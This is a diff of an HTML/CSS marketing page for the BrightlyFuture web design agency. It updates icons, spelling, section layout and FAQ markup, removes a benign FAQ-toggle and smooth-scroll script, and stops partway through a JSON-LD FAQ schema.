@@ -34,7 +34,7 @@
 #wd-wrap .wd-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
 #wd-wrap .wd-grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; }
 #wd-wrap .wd-card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 12px; padding: 28px 22px; }
-#wd-wrap .wd-card-icon { width: 52px; height: 52px; border-radius: 12px; background: var(--input-bg); color: var(--pri); font-size: 1.6rem; line-height: 1; display: flex; align-items: center; justify-content: center; margin-bottom: 14px; }
+#wd-wrap .wd-card-icon { font-size: 2rem; margin-bottom: 12px; display: block; }
 #wd-wrap .wd-steps { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; }
 #wd-wrap .wd-step { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 12px; padding: 24px 18px; text-align: center; }
 #wd-wrap .wd-step-num { width: 40px; height: 40px; background: var(--pri); color: #fff; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-weight: 700; font-size: 1.1rem; margin-bottom: 12px; }
@@ -58,11 +58,11 @@
 #wd-wrap .wd-cta-box .wd-btn { background: #fff; color: var(--pri) !important; }
 #wd-wrap .wd-cta-box .wd-btn:hover { background: #f0ecf7; }
 #wd-wrap .wd-faq-item { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 10px; margin-bottom: 10px; overflow: hidden; }
-#wd-wrap .wd-faq-q { width: 100%; background: none; border: none; padding: 18px 22px; text-align: left; font-size: 1rem; font-weight: 600; color: var(--heading); cursor: pointer; display: flex; justify-content: space-between; align-items: center; gap: 16px; font-family: inherit; }
-#wd-wrap .wd-faq-q::after { content: '+'; font-size: 1.4rem; color: var(--pri); flex-shrink: 0; }
-#wd-wrap .wd-faq-open .wd-faq-q::after { content: '\2212'; }
+#wd-wrap .wd-faq-q { width: 100%; background: none; border: none; padding: 18px 22px; text-align: left; font-size: 1rem; font-weight: 600; color: var(--heading); cursor: pointer; display: flex; justify-content: space-between; align-items: center; font-family: inherit; }
+#wd-wrap .wd-faq-q::after { content: '+'; font-size: 1.4rem; color: var(--pri); transition: transform 0.2s; }
+#wd-wrap .wd-faq-open .wd-faq-q::after { content: '-'; }
 #wd-wrap .wd-faq-a { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; }
-#wd-wrap .wd-faq-open .wd-faq-a { max-height: 600px; }
+#wd-wrap .wd-faq-open .wd-faq-a { max-height: 500px; }
 #wd-wrap .wd-faq-a p { padding: 0 22px 18px; color: var(--muted); }
 #wd-wrap .wd-checklist { list-style: none; }
 #wd-wrap .wd-checklist li { padding: 8px 0; padding-left: 28px; position: relative; color: var(--text); }
@@ -73,10 +73,12 @@
   #wd-wrap h1 { font-size: 1.7rem; }
   #wd-wrap h2 { font-size: 1.4rem; }
   #wd-wrap .wd-trust { gap: 16px; }
-  #wd-wrap .wd-cta-box { padding: 36px 20px; }
 }
 </style>
+
 <div id="wd-wrap">
+
+<!-- Hero -->
 <div class="wd-hero">
   <div class="wd-section">
     <h1>Websites That Convert Visitors Into Customers</h1>
@@ -90,48 +92,54 @@
     </div>
   </div>
 </div>
+
+<!-- Pain Points -->
 <div class="wd-section">
   <h2>Is Your Website Costing You Customers?</h2>
   <p class="wd-sub">A poorly designed website does not just look bad. It actively drives potential customers to your competitors.</p>
   <div class="wd-grid">
     <div class="wd-card">
-      <span class="wd-card-icon">&#10006;</span>
+      <span class="wd-card-icon">&#128683;</span>
       <h3>Outdated Design</h3>
       <p>An old-looking website destroys trust instantly. 75% of users judge a business's credibility based on its website design alone.</p>
     </div>
     <div class="wd-card">
-      <span class="wd-card-icon">&#8987;</span>
+      <span class="wd-card-icon">&#128034;</span>
       <h3>Slow Loading Speed</h3>
       <p>Every second of delay costs you 7% in conversions. If your site takes longer than 3 seconds to load, visitors leave before they even see your offer.</p>
     </div>
     <div class="wd-card">
-      <span class="wd-card-icon">&#9744;</span>
+      <span class="wd-card-icon">&#128241;</span>
       <h3>Not Mobile-Friendly</h3>
       <p>Over 60% of web traffic comes from mobile devices. If your site is not responsive, you are losing more than half your potential customers.</p>
     </div>
     <div class="wd-card">
-      <span class="wd-card-icon">&#9906;</span>
+      <span class="wd-card-icon">&#128269;</span>
       <h3>Invisible on Google</h3>
       <p>A beautiful website means nothing if nobody finds it. Without proper SEO foundations, your site is a billboard in the desert.</p>
     </div>
   </div>
 </div>
+
+<!-- Services -->
 <div class="wd-section-alt">
   <div class="wd-section">
     <h2>Our Web Design Services</h2>
     <p class="wd-sub">From concept to launch, we create websites that look stunning, load fast, and drive business results.</p>
     <div class="wd-grid">
-      <div class="wd-card"><span class="wd-card-icon">&#9998;</span><h3>Custom Website Design</h3><p>Unique, brand-aligned designs crafted from scratch. No cookie-cutter templates. Every pixel serves your business goals.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#127912;</span><h3>Custom Website Design</h3><p>Unique, brand-aligned designs crafted from scratch. No cookie-cutter templates. Every pixel serves your business goals.</p></div>
       <div class="wd-card"><span class="wd-card-icon">&#9881;</span><h3>WordPress Development</h3><p>Custom WordPress sites built with Elementor that you can easily update yourself. No coding required after handoff.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#9733;</span><h3>E-commerce Stores</h3><p>WooCommerce and Shopify stores designed to sell. Product pages, checkout flows, and payment integrations that maximise revenue.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#10148;</span><h3>Landing Pages</h3><p>High-converting landing pages for campaigns, product launches, and lead generation. Every element optimised for action.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#8635;</span><h3>Website Redesign</h3><p>Modernise your existing website without losing SEO equity. We migrate, redesign, and improve while preserving what works.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#9889;</span><h3>Speed Optimisation</h3><p>Core Web Vitals optimisation, image compression, caching, and code cleanup to get your site loading in under 3 seconds.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#9744;</span><h3>Mobile-First Design</h3><p>Every design starts mobile-first. Perfect experiences on phones, tablets, and desktops with responsive, fluid layouts.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#9678;</span><h3>UI/UX Design</h3><p>User experience research and interface design that guides visitors toward conversion with intuitive navigation and clear CTAs.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#128722;</span><h3>E-commerce Stores</h3><p>WooCommerce and Shopify stores designed to sell. Product pages, checkout flows, and payment integrations that maximize revenue.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#128640;</span><h3>Landing Pages</h3><p>High-converting landing pages for campaigns, product launches, and lead generation. Every element optimized for action.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#128260;</span><h3>Website Redesign</h3><p>Modernize your existing website without losing SEO equity. We migrate, redesign, and improve while preserving what works.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#9889;</span><h3>Speed Optimization</h3><p>Core Web Vitals optimization, image compression, caching, and code cleanup to get your site loading in under 3 seconds.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#128241;</span><h3>Mobile-First Design</h3><p>Every design starts mobile-first. Perfect experiences on phones, tablets, and desktops with responsive, fluid layouts.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#127919;</span><h3>UI/UX Design</h3><p>User experience research and interface design that guides visitors toward conversion with intuitive navigation and clear CTAs.</p></div>
     </div>
   </div>
 </div>
+
+<!-- Process -->
 <div class="wd-section">
   <h2>Our Design Process</h2>
   <p class="wd-sub">A structured 5-step process that turns your vision into a high-performing website, on time and on budget.</p>
@@ -143,22 +151,26 @@
     <div class="wd-step"><span class="wd-step-num">5</span><h3>Launch</h3><p>Testing, QA, and deployment with 30 days of post-launch support included.</p></div>
   </div>
 </div>
+
+<!-- Website Types -->
 <div class="wd-section-alt">
   <div class="wd-section">
     <h2>Website Types We Build</h2>
     <p class="wd-sub">From simple business sites to complex e-commerce platforms, we have the expertise to build what you need.</p>
     <div class="wd-grid">
       <div class="wd-card"><h3>Business Websites</h3><p>Professional corporate sites that establish credibility, showcase services, and generate leads for your business.</p></div>
-      <div class="wd-card"><h3>E-commerce Stores</h3><p>Online shops with product catalogues, shopping carts, payment gateways, and inventory management built to sell.</p></div>
+      <div class="wd-card"><h3>E-commerce Stores</h3><p>Online shops with product catalogs, shopping carts, payment gateways, and inventory management built to sell.</p></div>
       <div class="wd-card"><h3>Portfolio Sites</h3><p>Creative portfolios for designers, photographers, and agencies that showcase work beautifully and win new clients.</p></div>
-      <div class="wd-card"><h3>Blog &amp; Magazine</h3><p>Content-focused sites with optimised layouts for readability, SEO, and audience engagement.</p></div>
+      <div class="wd-card"><h3>Blog & Magazine</h3><p>Content-focused sites with optimized layouts for readability, SEO, and audience engagement.</p></div>
       <div class="wd-card"><h3>SaaS Landing Pages</h3><p>Conversion-focused pages for software products with feature showcases, pricing tables, and signup flows.</p></div>
       <div class="wd-card"><h3>Membership Sites</h3><p>Gated content, user accounts, subscription billing, and member dashboards for digital products and communities.</p></div>
-      <div class="wd-card"><h3>Directory &amp; Listings</h3><p>Searchable directories with filters, maps, and listing management for businesses, properties, or jobs.</p></div>
+      <div class="wd-card"><h3>Directory & Listings</h3><p>Searchable directories with filters, maps, and listing management for businesses, properties, or jobs.</p></div>
       <div class="wd-card"><h3>Non-Profit Sites</h3><p>Mission-driven websites with donation systems, event calendars, volunteer signups, and impact storytelling.</p></div>
     </div>
   </div>
 </div>
+
+<!-- Tech Stack -->
 <div class="wd-section">
   <h2>Technologies We Use</h2>
   <p class="wd-sub">We choose the right technology for each project. Here are the platforms and frameworks in our toolkit.</p>
@@ -175,20 +187,24 @@
     <span class="wd-tech-badge">PHP</span>
   </div>
 </div>
+
+<!-- Why Choose Us -->
 <div class="wd-section-alt">
   <div class="wd-section">
     <h2>Why Choose BrightlyFuture for Web Design</h2>
     <p class="wd-sub">We do not just make pretty websites. We build digital experiences that drive measurable business results.</p>
     <div class="wd-grid">
-      <div class="wd-card"><span class="wd-card-icon">&#9678;</span><h3>Conversion-Focused</h3><p>Every design decision is backed by UX research and conversion principles. Your site will look great and perform even better.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#9906;</span><h3>SEO Built-In</h3><p>Clean code, proper headings, schema markup, fast loading, and technical SEO foundations baked into every build.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#9889;</span><h3>Lightning Fast</h3><p>Sub-3-second load times guaranteed. We optimise images, minimise code, and use smart caching for peak performance.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#9744;</span><h3>Mobile-First</h3><p>Designed for mobile from day one, then scaled up. Perfect experiences on every screen size and orientation.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#9742;</span><h3>Ongoing Support</h3><p>30 days of free post-launch support plus affordable maintenance plans to keep your site secure and updated.</p></div>
-      <div class="wd-card"><span class="wd-card-icon">&#163;</span><h3>Transparent Pricing</h3><p>No hidden fees, no surprise charges. You get a detailed quote upfront with clear milestones and deliverables.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#127919;</span><h3>Conversion-Focused</h3><p>Every design decision is backed by UX research and conversion principles. Your site will look great and perform even better.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#128269;</span><h3>SEO Built-In</h3><p>Clean code, proper headings, schema markup, fast loading, and technical SEO foundations baked into every build.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#9889;</span><h3>Lightning Fast</h3><p>Sub-3-second load times guaranteed. We optimize images, minimize code, and use smart caching for peak performance.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#128241;</span><h3>Mobile-First</h3><p>Designed for mobile from day one, then scaled up. Perfect experiences on every screen size and orientation.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#128222;</span><h3>Ongoing Support</h3><p>30 days of free post-launch support plus affordable maintenance plans to keep your site secure and updated.</p></div>
+      <div class="wd-card"><span class="wd-card-icon">&#128176;</span><h3>Transparent Pricing</h3><p>No hidden fees, no surprise charges. You get a detailed quote upfront with clear milestones and deliverables.</p></div>
     </div>
   </div>
 </div>
+
+<!-- Results -->
 <div class="wd-section">
   <h2>The Results Speak for Themselves</h2>
   <div class="wd-stats">
@@ -198,17 +214,19 @@
     <div class="wd-stat"><strong>100%</strong><span>Mobile Responsive</span></div>
   </div>
 </div>
+
+<!-- What's Included -->
 <div class="wd-section-alt">
   <div class="wd-section">
-    <h2>What Is Included in Every Website</h2>
+    <h2>What is Included in Every Website</h2>
     <p class="wd-sub">Every website we build comes with these essentials as standard. No upsells, no hidden extras.</p>
-    <div class="wd-grid" style="grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));">
+    <div class="wd-grid" style="grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));">
       <div class="wd-card">
         <ul class="wd-checklist">
           <li>Custom, brand-aligned design</li>
           <li>Fully responsive on all devices</li>
           <li>SEO foundations and sitemap</li>
-          <li>Speed optimisation (sub-3s)</li>
+          <li>Speed optimization (sub-3s)</li>
           <li>SSL certificate setup</li>
           <li>Google Analytics integration</li>
         </ul>
@@ -217,7 +235,7 @@
         <ul class="wd-checklist">
           <li>Contact forms with spam protection</li>
           <li>Social media integration</li>
-          <li>Cookie consent and UK GDPR compliance</li>
+          <li>Cookie consent and GDPR compliance</li>
           <li>Browser and device testing</li>
           <li>Training session on your CMS</li>
           <li>30 days post-launch support</li>
@@ -226,6 +244,8 @@
     </div>
   </div>
 </div>
+
+<!-- Comparison Table -->
 <div class="wd-section">
   <h2>Template Website vs Custom Designed Website</h2>
   <p class="wd-sub">See why investing in a custom website pays off in the long run compared to a generic template.</p>
@@ -234,10 +254,10 @@
       <thead><tr><th>Feature</th><th>Template Website</th><th>Custom Design</th></tr></thead>
       <tbody>
         <tr><td>Uniqueness</td><td class="wd-cross">&#10007; Shared by thousands</td><td class="wd-check">&#10003; One of a kind</td></tr>
-        <tr><td>Branding</td><td class="wd-cross">&#10007; Limited customisation</td><td class="wd-check">&#10003; Fully brand-aligned</td></tr>
-        <tr><td>Performance</td><td class="wd-cross">&#10007; Bloated code</td><td class="wd-check">&#10003; Optimised and fast</td></tr>
+        <tr><td>Branding</td><td class="wd-cross">&#10007; Limited customization</td><td class="wd-check">&#10003; Fully brand-aligned</td></tr>
+        <tr><td>Performance</td><td class="wd-cross">&#10007; Bloated code</td><td class="wd-check">&#10003; Optimized and fast</td></tr>
         <tr><td>SEO</td><td class="wd-cross">&#10007; Generic structure</td><td class="wd-check">&#10003; SEO-first architecture</td></tr>
-        <tr><td>Conversions</td><td class="wd-cross">&#10007; Generic layouts</td><td class="wd-check">&#10003; Conversion-optimised</td></tr>
+        <tr><td>Conversions</td><td class="wd-cross">&#10007; Generic layouts</td><td class="wd-check">&#10003; Conversion-optimized</td></tr>
         <tr><td>Scalability</td><td class="wd-cross">&#10007; Hard to extend</td><td class="wd-check">&#10003; Built to grow</td></tr>
         <tr><td>Support</td><td class="wd-cross">&#10007; Forum help only</td><td class="wd-check">&#10003; Dedicated team</td></tr>
         <tr><td>Security</td><td class="wd-cross">&#10007; Common vulnerabilities</td><td class="wd-check">&#10003; Hardened setup</td></tr>
@@ -245,22 +265,26 @@
     </table>
   </div>
 </div>
+
+<!-- Industries -->
 <div class="wd-section-alt">
   <div class="wd-section">
     <h2>Industries We Serve</h2>
     <p class="wd-sub">We design websites tailored to the unique needs, audiences, and conversion goals of each industry.</p>
     <div class="wd-grid">
       <div class="wd-card"><h3>Tech Startups</h3><p>Modern, bold designs with product showcases, feature pages, and signup flows that attract investors and users.</p></div>
-      <div class="wd-card"><h3>E-commerce</h3><p>Online stores with intuitive navigation, fast checkout, and product pages designed to maximise average order value.</p></div>
-      <div class="wd-card"><h3>Healthcare</h3><p>GDPR-compliant websites with appointment booking, patient portals, and trust-building design for clinics and medical practices.</p></div>
+      <div class="wd-card"><h3>E-commerce</h3><p>Online stores with intuitive navigation, fast checkout, and product pages designed to maximize average order value.</p></div>
+      <div class="wd-card"><h3>Healthcare</h3><p>HIPAA-aware websites with appointment booking, patient portals, and trust-building design for medical practices.</p></div>
       <div class="wd-card"><h3>Legal</h3><p>Professional, authoritative websites for law firms with case study pages, practice area layouts, and lead capture.</p></div>
       <div class="wd-card"><h3>Real Estate</h3><p>Property listing sites with search filters, map integration, virtual tours, and lead generation for agents and agencies.</p></div>
-      <div class="wd-card"><h3>Restaurants</h3><p>Appetising designs with online menus, reservation systems, delivery integration, and location maps.</p></div>
-      <div class="wd-card"><h3>Education</h3><p>Learning platforms with course catalogues, student dashboards, enrolment systems, and content delivery.</p></div>
-      <div class="wd-card"><h3>Finance</h3><p>Secure, compliant websites for banks, fintech, and advisers with calculators, dashboards, and client portals.</p></div>
+      <div class="wd-card"><h3>Restaurants</h3><p>Appetizing designs with online menus, reservation systems, delivery integration, and location maps.</p></div>
+      <div class="wd-card"><h3>Education</h3><p>Learning platforms with course catalogs, student dashboards, enrollment systems, and content delivery.</p></div>
+      <div class="wd-card"><h3>Finance</h3><p>Secure, compliant websites for banks, fintech, and advisors with calculators, dashboards, and client portals.</p></div>
     </div>
   </div>
 </div>
+
+<!-- Testimonials -->
 <div class="wd-section">
   <h2>What Our Clients Say</h2>
   <div class="wd-grid-3">
@@ -278,71 +302,66 @@
     </div>
   </div>
 </div>
-<div class="wd-section" id="wd-contact">
-  <div class="wd-cta-box">
-    <h2>Ready for a Website That Actually Converts?</h2>
-    <p>Your website should be your best salesperson. Let us build one that looks incredible, loads instantly, ranks on Google, and turns visitors into customers. Get a free audit today.</p>
-    <a href="/contact/" class="wd-btn" style="margin-top:16px;">Get Your Free Website Audit</a>
+
+<!-- CTA -->
+<div class="wd-section-alt">
+  <div class="wd-section" id="wd-contact">
+    <div class="wd-cta-box">
+      <h2>Ready for a Website That Actually Converts?</h2>
+      <p>Your website should be your best salesperson. Let us build one that looks incredible, loads instantly, ranks on Google, and turns visitors into customers. Get a free audit today.</p>
+      <a href="/contact/" class="wd-btn" style="margin-top:16px;">Get Your Free Website Audit</a>
+    </div>
   </div>
 </div>
+
+<!-- FAQs -->
+<div class="wd-section">
+  <h2>Frequently Asked Questions</h2>
+  <p class="wd-sub">Everything you need to know about our web design and development services.</p>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">How much does a website cost?</button><div class="wd-faq-a"><p>Website costs depend on complexity, features, and scope. A basic business website starts from a few hundred pounds, while custom e-commerce sites with advanced features are priced higher. We provide a detailed quote after understanding your requirements.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">How long does it take to build a website?</button><div class="wd-faq-a"><p>A standard business website takes 3 to 4 weeks. E-commerce stores and complex custom builds typically take 6 to 8 weeks. Timelines depend on content readiness, feedback speed, and feature complexity. We provide a detailed timeline at project kickoff.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Do you build WordPress websites?</button><div class="wd-faq-a"><p>Yes, WordPress is our primary platform. We build custom WordPress sites using Elementor that are easy for you to manage without any coding knowledge. We also work with Shopify, React, and Next.js for specific project needs.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Will my website be mobile-friendly?</button><div class="wd-faq-a"><p>Absolutely. Every website we build is designed mobile-first and tested across all major devices, browsers, and screen sizes. With over 60% of traffic coming from mobile, responsive design is non-negotiable for us.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Do you handle hosting and domains?</button><div class="wd-faq-a"><p>We can recommend and set up hosting, register domains, configure DNS, and handle SSL certificates. We work with trusted hosting providers to ensure your site is fast, secure, and reliable with 99.9% uptime.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Will my website be SEO-friendly?</button><div class="wd-faq-a"><p>Yes. Every site includes clean code, proper heading structure, schema markup, XML sitemaps, fast loading, image optimization, and meta tag setup. We build the technical SEO foundation so your content can rank.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Can I update the website myself after launch?</button><div class="wd-faq-a"><p>Yes. We build on WordPress with Elementor so you can easily update text, images, and pages without touching code. We also provide a training session and documentation to get you comfortable with your new site.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Do you offer website maintenance?</button><div class="wd-faq-a"><p>Yes. We offer monthly maintenance plans that include security updates, plugin updates, backups, performance monitoring, and minor content changes. This keeps your site secure, fast, and running smoothly.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">How many revisions do I get?</button><div class="wd-faq-a"><p>We include 2 rounds of design revisions at the mockup stage and 1 round during development. Most clients are happy after the first revision. Additional revisions beyond the included rounds are available at a fair hourly rate.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Can you redesign my existing website?</button><div class="wd-faq-a"><p>Yes. We specialize in website redesigns that modernize your look while preserving your existing SEO rankings, content, and URL structure. We handle the migration carefully so you do not lose any search traffic.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Do you build e-commerce websites?</button><div class="wd-faq-a"><p>Yes. We build e-commerce stores on WooCommerce and Shopify with product management, payment gateways, shipping integrations, inventory tracking, and optimized checkout flows designed to maximize sales.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">What do you need from me to get started?</button><div class="wd-faq-a"><p>We need your branding assets (logo, colors, fonts), content (text and images), examples of websites you like, and a clear idea of your goals. If you do not have content ready, we can create it for you as part of our content marketing services.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Will my website be secure?</button><div class="wd-faq-a"><p>Yes. We implement SSL certificates, security plugins, firewall protection, regular backups, and hardened WordPress configurations. We follow security best practices to protect your site from common threats.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">Do you provide website analytics?</button><div class="wd-faq-a"><p>Yes. We set up Google Analytics 4, Google Search Console, and any additional tracking you need. You will have full visibility into your traffic, user behavior, conversions, and performance from day one.</p></div></div>
+
+  <div class="wd-faq-item"><button type="button" class="wd-faq-q">What makes BrightlyFuture different from other web design agencies?</button><div class="wd-faq-a"><p>We focus on results, not just aesthetics. Every website we build is optimized for speed, SEO, and conversions. We combine beautiful design with data-driven strategy to create websites that actually grow your business, not just look good in a portfolio.</p></div></div>
+
+</div>
+
+<!-- Final CTA -->
 <div class="wd-section-alt">
   <div class="wd-section">
-    <h2>Frequently Asked Questions</h2>
-    <p class="wd-sub">Everything you need to know about our web design and development services.</p>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">How much does a website cost?</button><div class="wd-faq-a"><p>Website costs depend on complexity, features, and scope. A basic business website starts from a few hundred pounds, while custom e-commerce sites with advanced features are priced higher. We provide a detailed, fixed quote after understanding your requirements.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">How long does it take to build a website?</button><div class="wd-faq-a"><p>A standard business website takes 3 to 4 weeks. E-commerce stores and complex custom builds typically take 6 to 8 weeks. Timelines depend on content readiness, feedback speed, and feature complexity. We provide a detailed timeline at project kickoff.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Do you build WordPress websites?</button><div class="wd-faq-a"><p>Yes, WordPress is our primary platform. We build custom WordPress sites using Elementor that are easy for you to manage without any coding knowledge. We also work with Shopify, React, and Next.js for specific project needs.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Will my website be mobile-friendly?</button><div class="wd-faq-a"><p>Absolutely. Every website we build is designed mobile-first and tested across all major devices, browsers, and screen sizes. With over 60% of traffic coming from mobile, responsive design is non-negotiable for us.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Do you handle hosting and domains?</button><div class="wd-faq-a"><p>Yes. We can recommend and set up hosting, register domains, configure DNS, and install SSL certificates. We work with trusted hosting providers to keep your site fast, secure, and reliable with 99.9% uptime.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Will my website be SEO-friendly?</button><div class="wd-faq-a"><p>Yes. Every site includes clean code, proper heading structure, schema markup, XML sitemaps, fast loading, image optimisation, and meta tag setup. We build the technical SEO foundation so your content can rank.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Can I update the website myself after launch?</button><div class="wd-faq-a"><p>Yes. We build on WordPress with Elementor so you can easily update text, images, and pages without touching code. We also provide a training session and documentation to get you comfortable with your new site.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Do you offer website maintenance?</button><div class="wd-faq-a"><p>Yes. We offer monthly maintenance plans that include security updates, plugin updates, backups, performance monitoring, and minor content changes. This keeps your site secure, fast, and running smoothly.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">How many revisions do I get?</button><div class="wd-faq-a"><p>We include 2 rounds of design revisions at the mockup stage and 1 round during development. Most clients are happy after the first revision. Additional revisions beyond the included rounds are available at a fair hourly rate.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Can you redesign my existing website?</button><div class="wd-faq-a"><p>Yes. We specialise in website redesigns that modernise your look while preserving your existing SEO rankings, content, and URL structure. We set up proper 301 redirects and handle the migration carefully so you do not lose search traffic.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Do you build e-commerce websites?</button><div class="wd-faq-a"><p>Yes. We build e-commerce stores on WooCommerce and Shopify with product management, payment gateways, shipping integrations, inventory tracking, and optimised checkout flows designed to maximise sales.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">What do you need from me to get started?</button><div class="wd-faq-a"><p>We need your branding assets (logo, colours, fonts), content (text and images), examples of websites you like, and a clear idea of your goals. If you do not have content ready, we can create it for you as part of our content marketing services.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Will my website be secure?</button><div class="wd-faq-a"><p>Yes. We implement SSL certificates, security plugins, firewall protection, regular backups, and hardened WordPress configurations. We follow security best practices to protect your site from common threats.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">Do you provide website analytics?</button><div class="wd-faq-a"><p>Yes. We set up Google Analytics 4, Google Search Console, and any additional tracking you need. You will have full visibility into your traffic, user behaviour, conversions, and performance from day one.</p></div></div>
-    <div class="wd-faq-item"><button type="button" class="wd-faq-q" aria-expanded="false">What makes BrightlyFuture different from other web design agencies?</button><div class="wd-faq-a"><p>We focus on results, not just aesthetics. Every website we build is optimised for speed, SEO, and conversions. We combine beautiful design with data-driven strategy to create websites that actually grow your business, not just look good in a portfolio.</p></div></div>
+    <div class="wd-cta-box">
+      <h2>Let Us Build Your Dream Website</h2>
+      <p>Stop losing customers to a mediocre website. Get a fast, beautiful, conversion-optimized site that works as hard as you do.</p>
+      <a href="/contact/" class="wd-btn" style="margin-top:16px;">Start Your Project Today</a>
+    </div>
   </div>
 </div>
-<div class="wd-section">
-  <div class="wd-cta-box">
-    <h2>Let Us Build Your Dream Website</h2>
-    <p>Stop losing customers to a mediocre website. Get a fast, beautiful, conversion-optimised site that works as hard as you do.</p>
-    <a href="/contact/" class="wd-btn" style="margin-top:16px;">Start Your Project Today</a>
-  </div>
+
 </div>
-</div>
-<script>
-(function(){
-  function init(){
-    var wrap = document.getElementById('wd-wrap');
-    if (!wrap || wrap.getAttribute('data-wd-init')) return;
-    wrap.setAttribute('data-wd-init', '1');
-    wrap.querySelectorAll('.wd-faq-q').forEach(function(btn){
-      btn.addEventListener('click', function(){
-        var item = this.parentElement;
-        var isOpen = item.classList.contains('wd-faq-open');
-        wrap.querySelectorAll('.wd-faq-item').forEach(function(el){
-          el.classList.remove('wd-faq-open');
-          el.querySelector('.wd-faq-q').setAttribute('aria-expanded', 'false');
-        });
-        if (!isOpen) {
-          item.classList.add('wd-faq-open');
-          this.setAttribute('aria-expanded', 'true');
-        }
-      });
-    });
-    wrap.querySelectorAll('a[href^="#"]').forEach(function(a){
-      a.addEventListener('click', function(e){
-        var target = document.querySelector(this.getAttribute('href'));
-        if (target) { e.preventDefault(); target.scrollIntoView({behavior:'smooth', block:'start'}); }
-      });
-    });
-  }
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
-  else init();
-})();
-</script>
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"How much does a website cost?","acceptedAnswer":{"@type":"Answer","text":"Website costs depend on complexity, features, and scope. A basic business website starts from a few hundred pounds, while custom e-commerce sites with advanced features are priced higher. We provide a detailed, fixed quote after understanding your requirements."}},{"@type":"Question","name":"How long does it take to build a website?","acceptedAnswer":{"@type":"Answer","text":"A standard business website takes 3 to 4 weeks. E-commerce stores and complex custom builds typically take 6 to 8 weeks. Timelines depend on content readiness, feedback speed, and feature complexity. We provide a detailed timeline at project kickoff."}},{"@type":"Question","name":"Do you build WordPress websites?","acceptedAnswer":{"@type":"Answer","text":"Yes, WordPress is our primary platform. We build custom WordPress sites using Elementor that are easy for you to manage without any coding knowledge. We also work with Shopify, React, and Next.js for specific project needs."}},{"@type":"Question","name":"Will my website be mobile-friendly?","acceptedAnswer":{"@type":"Answer","text":"Absolutely. Every website we build is designed mobile-first and tested across all major devices, browsers, and screen sizes. With over 60% of traffic coming from mobile, responsive design is non-negotiable for us."}},{"@type":"Question","name":"Do you handle hosting and domains?","acceptedAnswer":{"@type":"Answer","text":"Yes. We can recommend and set up hosting, register domains, configure DNS, and install SSL certificates. We work with trusted hosting providers to keep your site fast, secure, and reliable with 99.9% 